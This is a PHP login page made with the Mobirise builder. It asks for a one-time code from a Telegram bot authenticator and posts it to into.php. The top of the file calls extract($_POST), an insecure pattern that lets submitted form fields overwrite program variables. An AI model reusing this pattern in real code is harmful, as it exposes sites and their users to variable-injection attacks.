<?php 
 session_start();   // session starts with the help of this function 

 extract($_POST);   

 if(isset($_SESSION['uuid'])) 
 // Checking whether the session is already there or not if 
                               // true then header redirect it to the home page directly 
  {
     header("Location:mtee.php"); 
     // extract session for profile
  }
 
 ?>
<html>
<head>
  <!-- Site made with Mobirise Website Builder v5.9.18, https://mobirise.com -->
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Mobirise v5.9.18, mobirise.com">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
  <link rel="shortcut icon" href="assets/images/28782656-2-96x38.png" type="image/x-icon">
  <meta name="description" content="">
  
  
  <!-- == == -->

  <title>Login</title>
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
  <link rel="stylesheet" href="assets/animatecss/animate.css">
  <link rel="stylesheet" href="assets/dropdown/css/style.css">
  <link rel="stylesheet" href="assets/socicon/css/styles.css">
  <link rel="stylesheet" href="assets/theme/css/style.css">
  <link rel="preload" href="https://fonts.googleapis.com/css?family=Lexend:100,200,300,400,500,600,700,800,900&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lexend:100,200,300,400,500,600,700,800,900&display=swap"></noscript>
  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css?v=2vh5f2"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css?v=2vh5f2" type="text/css">

  
  
  
</head>

<body >
<section data-bs-version="5.1" class="form9 cid-ukGIbE3bqw" id="form9-s">
    
    <div class="mbr-overlay"></div>
    <div class="container">
        <div class="mbr-section-head">
            <h3 class="mbr-section-title mbr-fonts-style align-center mb-0 display-2">
                <strong>User Sign In</strong></h3>
            <h4 class="mbr-section-subtitle mbr-fonts-style align-center mb-0 mt-2 display-5">
                Form Subtitle
            </h4>
        </div>
        <div class="row justify-content-center mt-4">
            <div class="col-lg-8 mx-auto mbr-form" >
                <form action="into.php" method="POST" class="mbr-form form-with-styler mx-auto" data-form-title="Form Name">
                    <input type="hidden" name="email" data-form-email="true" value="nqQi5FFPbcleSmsOH30ZOQ5jX6MCBOVTNCYdK2u+3a6FAbMJOFlHBOapxkjJwuy4rHFDwG3XugJPT+96sNfeOkoBMz+5q+Uo+eSQmYIv6aOEya0FjhnpuYmp9lGOu2lY">
                   
                    <div class="row">
                        <div hidden="hidden" data-form-alert="" class="alert alert-success col-12">Thanks for filling out the form!</div>
                        <div hidden="hidden" data-form-alert-danger="" class="alert alert-danger col-12">Oops...! some problem!</div>
                    </div>
                    <div class="dragArea row">
                        <div class="col-lg-12">
                            <p  class="mbr-text mbr-fonts-style align-center mb-4 display-7">Get OTP from your Telegram account Bot Authenticator</p>
                        </div>
                        <div  class="col-lg-4 col-md-12 col-sm-12 form-group mb-3" data-for="name">
                            <input type="Password" name="pass" placeholder= " O T P CODE" data-form-field="pass" class="form-control" value="" id="demo-form9-s">
                        </div>

                        <div class="col-lg-4 col-md-12 col-sm-12 mbr-section-btn align-center"><button type="submit" class="btn btn-success display-4">Submit</button></div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</section>
<section class="display-7" style="padding: 0;align-items: center;justify-content: center;flex-wrap: wrap;    align-content: center;display: flex;position: relative;height: 4rem;"><a href="https://mobiri.se/" style="flex: 1 1;height: 4rem;position: absolute;width: 100%;z-index: 1;"><img alt="" style="height: 4rem;" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="></a><p style="margin: 0;text-align: center;" class="display-7">&#8204;</p><a style="z-index:1" href="https://mobirise.com/builder/ai-website-maker.html"></a></section><script src="assets/bootstrap/js/bootstrap.bundle.min.js"></script>  <script src="assets/smoothscroll/smooth-scroll.js"></script>  <script src="assets/ytplayer/index.js"></script>  <script src="assets/mbr-tabs/mbr-tabs.js"></script>  <script src="assets/dropdown/js/navbar-dropdown.js"></script>  <script src="assets/theme/js/script.js"></script>  <script src="assets/formoid/formoid.min.js"></script>  
  
  
  <div id="scrollToTop" class="scrollToTop mbr-arrow-up"><a style="text-align: center;"><i class="mbr-arrow-up-icon mbr-arrow-up-icon-cm cm-icon cm-icon-smallarrow-up"></i></a></div>
     <input name="animation" type="hidden">
</body>
</html>